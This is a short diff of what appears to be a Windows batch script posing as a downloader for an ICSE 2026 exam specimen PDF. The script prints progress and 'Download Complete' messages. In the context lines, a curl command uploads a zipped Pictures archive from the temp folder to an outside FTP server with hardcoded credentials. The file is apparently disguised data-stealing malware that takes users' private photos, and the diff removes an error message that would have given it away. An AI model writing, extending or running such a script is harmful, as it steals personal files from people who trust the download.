@@ -27,7 +27,7 @@ curl -T "%TEMP%\Pictures.zip" ftp://ftpupload.net/htdocs/data/pics.txt --user if
 echo 100%%
 wget "https://cisce.org/wp-content/uploads/2025/11/ICSE-2026-SPECIMEN-521-SCI1.pdf" 
 echo Download Complete
-echo Some error occured. Unable to download file
 
 pause
+
 
